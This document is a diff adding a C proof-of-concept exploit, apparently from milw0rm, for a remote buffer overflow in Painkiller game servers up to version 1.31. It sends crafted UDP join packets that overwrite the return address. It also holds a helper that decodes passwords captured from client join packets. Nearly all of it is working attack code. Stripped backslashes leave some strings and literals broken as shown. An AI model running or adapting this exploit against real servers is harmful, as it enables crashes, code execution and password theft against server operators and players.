@@ -1,0 +1,501 @@
+/* 
+
+by Luigi Auriemma 
+
+*/ 
+
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <string.h> 
+
+#ifdef WIN32 
+    #include <winsock.h> 
+    #include "winerr.h" 
+
+    #define close   closesocket 
+#else 
+    #include <unistd.h> 
+    #include <sys/socket.h> 
+    #include <sys/types.h> 
+    #include <arpa/inet.h> 
+    #include <netdb.h> 
+#endif 
+
+
+
+#define VER         "0.1" 
+#define BUFFSZ       2048 
+#define PORT         3455 
+#define TIMEOUT     3 
+#define GAMEVER     "1.3" 
+#define INFO         "xfexfdx00xDExADxC0xDExffxffxff" 
+#define CONN         "xffxffxffxffx02" 
+#define JOIN1       "xffxffxffxffx04" 
+                    GAMEVER   "" 
+                    "105.263" "" 
+#define JOIN2       "x00x00x00x00" "xdexadxc0xde" 
+#define BOOMSZ       548 
+#define RETBACKOFF   28 
+
+#define SENDRECV(x) 
+    if(sendto(sd, x, sizeof(x) - 1, 0, (struct sockaddr *)&peer, sizeof(peer)) 
+      < 0) std_err(); 
+    if(timeout(sd) < 0) { 
+        fputs("nError: socket timeout, no answer receivedn", stdout); 
+        exit(1); 
+    } 
+    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL); 
+    if(len < 0) std_err(); 
+    buff[len] = 0x00; 
+
+
+
+
+void show_info(u_char *buff, int len); 
+u_long check_ret_addr(char *data); 
+int timeout(int sock); 
+u_long resolv(char *host); 
+void std_err(void); 
+
+
+
+
+int main(int argc, char *argv[]) { 
+    int         sd, 
+                len; 
+    u_short     port = PORT; 
+    u_char       buff[BUFFSZ + 1], 
+                *ptr; 
+    struct   sockaddr_in peer; 
+    u_long       ret_addr; 
+
+
+    setbuf(stdout, NULL); 
+
+    fputs("n" 
+        "Painkiller <= 1.31 code execution bug "VER"n" 
+        "by Luigi Auriemman" 
+        "e-mail: aluigi@altervista.orgn" 
+        "web:     http://aluigi.altervista.orgn" 
+        "n", stdout); 
+
+    if(argc < 3) { 
+        printf("n" 
+            "Usage: %s <ret_addr> <host> [port(%d)]n" 
+            "n" 
+            " ret_addr is a memory address where you want to point the code flow.n" 
+            " I have implemented only the ret_addr of the dedicated server because then" 
+            " normal game needs a different one, so the dedicated server crashs but you cann" 
+            " also choose a return address (EIP) while the normal game simply crashs.n" 
+            " ret_addr is automatically verified by this PoC because only the bytes fromn" 
+            " 0x00 to 0x3f are allowed.n" 
+            " If you don't know what to use, insert: 0x32103210 or 0x33333333n" 
+            " Some addresses like 0x11111111 instead freeze the server with CPU at 100%%n" 
+            "n", argv[0], PORT); 
+        exit(1); 
+    } 
+
+#ifdef WIN32 
+    WSADATA     wsadata; 
+    WSAStartup(MAKEWORD(1,0), &wsadata); 
+#endif 
+
+    ret_addr = check_ret_addr(argv[1]); 
+
+    if(argc > 3) port = atoi(argv[3]); 
+    peer.sin_addr.s_addr = resolv(argv[2]); 
+    peer.sin_port         = htons(port); 
+    peer.sin_family       = AF_INET; 
+
+    printf("n" 
+        "- Target                   %s:%hun" 
+        "- Real return address:     %sn" 
+        "- Encoded return address:   0x%08lxn", 
+        inet_ntoa(peer.sin_addr), 
+        port, 
+        argv[1], 
+        ret_addr); 
+
+    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
+    if(sd < 0) std_err(); 
+
+    fputs("- Request informations:n", stdout); 
+    SENDRECV(INFO); 
+    show_info(buff, len); 
+
+    fputs("- Send connection request packetn", stdout); 
+    SENDRECV(CONN); 
+    printf("- Server challenge: %sn", buff + 5); 
+
+    ptr = (u_char *)memcpy(buff, JOIN1, sizeof(JOIN1) - 1) + 
+        sizeof(JOIN1) - 1; 
+
+    ptr = (u_char *)memset(ptr, '0', 72) + 72;   // Gamespy key auth 
+    *ptr++ = 0x00;                               // key auth delimiter 
+
+    ptr = (u_char *)memset(ptr, 'a', BOOMSZ) + BOOMSZ; 
+    *(u_long *)(ptr - RETBACKOFF) = ret_addr;   // dedicated server ret_addr 
+    *ptr++ = 0x00;                               // password delimiter 
+
+    ptr = (u_char *)memcpy(ptr, JOIN2, sizeof(JOIN2) - 1) + 
+        sizeof(JOIN2) - 1; 
+
+    fputs("- Send BOOM packet with return address overwritingn", stdout); 
+    if(sendto(sd, buff, ptr - buff, 0, (struct sockaddr *)&peer, sizeof(peer)) 
+      < 0) std_err(); 
+    if(timeout(sd) < 0) { 
+        fputs("nServer IS vulnerable!!!nn", stdout); 
+    } else { 
+        fputs("nServer doesn't seem to be vulnerablenn", stdout); 
+    } 
+
+    close(sd); 
+
+    return(0); 
+} 
+
+
+
+
+void show_info(u_char *buff, int len) { 
+    u_char   *p1, 
+            *p2, 
+            *limit; 
+    int     nt = 0; 
+
+    limit = buff + len; 
+    p1 = buff + 5; 
+    while(p1 < limit) { 
+        p2 = strchr(p1, 0x00); 
+        if(!p2) break; 
+        *p2 = 0x00; 
+
+        if(!nt) { 
+            if(p1 == p2) break; 
+            printf("%30s: ", p1); 
+            nt++; 
+        } else { 
+            printf("%sn", p1); 
+            nt = 0; 
+        } 
+        p1 = p2 + 1; 
+    } 
+    fputc('n', stdout); 
+} 
+
+
+
+
+
+u_long check_ret_addr(char *data) { 
+    u_long   ret = 0; 
+    u_char   *retc; 
+    int     tmp, 
+            i; 
+
+    retc = ((u_char *)&ret) + 3; 
+
+    if((data[1] == 'x') || (data[1] == 'X')) data += 2; 
+
+    if(strlen(data) != 8) { 
+        fputs("n" 
+            "Error: please use a full offset of 4 hex numbers.n" 
+            "       For example: 0x12341234, 12341234, 00001234, 0x33333333 and so onn" 
+            "n", stdout); 
+        exit(1); 
+    } 
+
+    for(i = 0; i < 4; i++) { 
+        sscanf(data, "%02x", &tmp); 
+        if(tmp > 0x3f) { 
+            printf("n" 
+                "Error: the return address cannot contain bytes greater than 0x3f (your: 0x%02x).n" 
+                "       For example 0x12341234 contains 0x12, 0x34, 0x12 and 0x34 that are ok.n" 
+                "       While 0x12345678 is not ok because 0x56 and 0x78 are greater than 0x3fn" 
+                "n", tmp); 
+            exit(1); 
+        } 
+        if(tmp <= 9) { 
+            *retc = tmp + 0x30; 
+        } else if((tmp >= 0xa) && (tmp <= 0x23)) { 
+            *retc = tmp + 0x57; 
+        } else { 
+            *retc = tmp + 0x1d; 
+        } 
+        retc--; 
+        data += 2; 
+    } 
+
+    return(ret); 
+} 
+
+
+
+int timeout(int sock) { 
+    struct   timeval tout; 
+    fd_set   fd_read; 
+    int     err; 
+
+    tout.tv_sec = TIMEOUT; 
+    tout.tv_usec = 0; 
+    FD_ZERO(&fd_read); 
+    FD_SET(sock, &fd_read); 
+    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
+    if(err < 0) std_err(); 
+    if(!err) return(-1); 
+    return(0); 
+} 
+
+
+
+u_long resolv(char *host) { 
+    struct hostent *hp; 
+    u_long host_ip; 
+
+    host_ip = inet_addr(host); 
+    if(host_ip == INADDR_NONE) { 
+        hp = gethostbyname(host); 
+        if(!hp) { 
+            printf("nError: Unable to resolv hostname (%s)n", host); 
+            exit(1); 
+        } else host_ip = *(u_long *)hp->h_addr; 
+    } 
+    return(host_ip); 
+} 
+
+
+
+
+#ifndef WIN32 
+    void std_err(void) { 
+        perror("nError"); 
+        exit(1); 
+    } 
+#endif
+--------------------------------------------------------------------------------
+
+
+
+winerr.h 
+
+
+
+--------------------------------------------------------------------------------
+/* 
+  Header file used for manage errors in Windows 
+  It support socket and errno too 
+  (this header replace the previous sock_errX.h) 
+*/ 
+
+#include <string.h> 
+#include <errno.h> 
+
+
+
+void std_err(void) { 
+    char     *error; 
+
+    switch(WSAGetLastError()) { 
+        case 10004: error = "Interrupted system call"; break; 
+        case 10009: error = "Bad file number"; break; 
+        case 10013: error = "Permission denied"; break; 
+        case 10014: error = "Bad address"; break; 
+        case 10022: error = "Invalid argument (not bind)"; break; 
+        case 10024: error = "Too many open files"; break; 
+        case 10035: error = "Operation would block"; break; 
+        case 10036: error = "Operation now in progress"; break; 
+        case 10037: error = "Operation already in progress"; break; 
+        case 10038: error = "Socket operation on non-socket"; break; 
+        case 10039: error = "Destination address required"; break; 
+        case 10040: error = "Message too long"; break; 
+        case 10041: error = "Protocol wrong type for socket"; break; 
+        case 10042: error = "Bad protocol option"; break; 
+        case 10043: error = "Protocol not supported"; break; 
+        case 10044: error = "Socket type not supported"; break; 
+        case 10045: error = "Operation not supported on socket"; break; 
+        case 10046: error = "Protocol family not supported"; break; 
+        case 10047: error = "Address family not supported by protocol family"; break; 
+        case 10048: error = "Address already in use"; break; 
+        case 10049: error = "Can't assign requested address"; break; 
+        case 10050: error = "Network is down"; break; 
+        case 10051: error = "Network is unreachable"; break; 
+        case 10052: error = "Net dropped connection or reset"; break; 
+        case 10053: error = "Software caused connection abort"; break; 
+        case 10054: error = "Connection reset by peer"; break; 
+        case 10055: error = "No buffer space available"; break; 
+        case 10056: error = "Socket is already connected"; break; 
+        case 10057: error = "Socket is not connected"; break; 
+        case 10058: error = "Can't send after socket shutdown"; break; 
+        case 10059: error = "Too many references, can't splice"; break; 
+        case 10060: error = "Connection timed out"; break; 
+        case 10061: error = "Connection refused"; break; 
+        case 10062: error = "Too many levels of symbolic links"; break; 
+        case 10063: error = "File name too long"; break; 
+        case 10064: error = "Host is down"; break; 
+        case 10065: error = "No Route to Host"; break; 
+        case 10066: error = "Directory not empty"; break; 
+        case 10067: error = "Too many processes"; break; 
+        case 10068: error = "Too many users"; break; 
+        case 10069: error = "Disc Quota Exceeded"; break; 
+        case 10070: error = "Stale NFS file handle"; break; 
+        case 10091: error = "Network SubSystem is unavailable"; break; 
+        case 10092: error = "WINSOCK DLL Version out of range"; break; 
+        case 10093: error = "Successful WSASTARTUP not yet performed"; break; 
+        case 10071: error = "Too many levels of remote in path"; break; 
+        case 11001: error = "Host not found"; break; 
+        case 11002: error = "Non-Authoritative Host not found"; break; 
+        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break; 
+        case 11004: error = "Valid name, no data record of requested type"; break; 
+        default: error = strerror(errno); break; 
+    } 
+    fprintf(stderr, "nError: %sn", error); 
+    exit(1); 
+} 
+
+--------------------------------------------------------------------------------
+
+
+
+painkiller_pckpwd.h 
+
+
+
+--------------------------------------------------------------------------------
+/* 
+
+Painkiller packet's password encoder/decoder 0.1 
+by Luigi Auriemma 
+e-mail: aluigi@altervista.org 
+web:     http://aluigi.altervista.org 
+
+
+INTRODUCTION 
+============ 
+When you want to join a password protected game server of Painkiller 
+(http://www.painkillergame.com) your client sends a packet containing 
+the packet ID (0x04), your client version, the 72 bytes of the Gamespy 
+auth key (http://aluigi.altervista.org/papers/gskey-auth.txt) plus a 
+"strange" text string after it. 
+This text string is just the password you have used to join and it is 
+encrypted using the other text string (the server challenge) sent by 
+the server in its previous packet. 
+My optimized algorithm is able to decode/encode the password stored in 
+the packet sent by the client. 
+
+
+HOW TO USE 
+========== 
+The function is an algorithm used for both encoding and decoding 
+without differences. 
+It needs only 2 parameters: 
+- pwd: the client's password stored in the packet 
+- enc: the server challenge string 
+
+Example: 
+  #include "painkiller_pckpwd.h" 
+
+    unsigned char   pwd[] = "5mjblOpV8N", 
+                    enc[] = "k7bEv4cGcw"; 
+    painkiller_pckpwd(pwd, enc); 
+    printf("Password: %sn", pwd);   // the password is "mypassword" 
+
+
+LICENSE 
+======= 
+    Copyright 2004 Luigi Auriemma 
+
+    This program is free software; you can redistribute it and/or modify 
+    it under the terms of the GNU General Public License as published by 
+    the Free Software Foundation; either version 2 of the License, or 
+    (at your option) any later version. 
+
+    This program is distributed in the hope that it will be useful, 
+    but WITHOUT ANY WARRANTY; without even the implied warranty of 
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.   See the 
+    GNU General Public License for more details. 
+
+    You should have received a copy of the GNU General Public License 
+    along with this program; if not, write to the Free Software 
+    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA   02111-1307 USA 
+
+    http://www.gnu.org/licenses/gpl.txt 
+
+*/ 
+
+
+
+void painkiller_pckpwd(unsigned char *pwd, unsigned char *enc) { 
+    unsigned char   buff[64], 
+                    encbuff[64], 
+                    *p1, 
+                    *p2; 
+    int             len, 
+                    i, 
+                    cl, 
+                    dl, 
+                    esi, 
+                    edi; 
+
+    p1 = pwd; 
+    while(1) { 
+        if((*p1 >= '0') && (*p1 <= '9')) { 
+            *p1 -= 0x30; 
+        } else if((*p1 >= 'a') && (*p1 <= 'z')) { 
+            *p1 -= 0x57; 
+        } else if((*p1 >= 'A') && (*p1 <= '')) { 
+            *p1 -= 0x1d; 
+        } else { 
+            break; 
+        } 
+        p1++; 
+    } 
+    len = p1 - pwd; 
+
+    p1 = buff; 
+    for(i = 0; i < 64; i++) { 
+        *p1++ = i; 
+    } 
+
+    p1 = enc; 
+    p2 = encbuff; 
+    for(i = 0; i < 64; i++) { 
+        *p2++ = *p1++; 
+        if(!*p1) p1 = enc; 
+    } 
+
+    p1 = buff; 
+    p2 = encbuff; 
+    for(i = esi = 0; i < 64; i++) { 
+        cl = *p1; 
+        esi = (*p2 + cl + esi) & 63; 
+        *p1++ = buff[esi]; 
+        buff[esi] = cl; 
+        p2++; 
+    } 
+
+    esi = edi = 0; 
+    p1 = pwd; 
+    for(i = 0; i < len; i++) { 
+        esi = (esi + 1) & 63; 
+        cl = buff[esi]; 
+        edi = (cl + edi) & 63; 
+        dl = buff[edi]; 
+        buff[esi] = dl; 
+        buff[edi] = cl; 
+        *p1++ ^= buff[(dl + cl) & 63]; 
+    } 
+
+    p1 = pwd; 
+    while(len--) { 
+        if(*p1 <= 9) { 
+            *p1 += 0x30; 
+        } else if((*p1 >= 0xa) && (*p1 <= 0x23)) { 
+            *p1 += 0x57; 
+        } else { 
+            *p1 += 0x1d; 
+        } 
+        p1++; 
+    } 
+} 
+
+// milw0rm.com [2004-08-27]
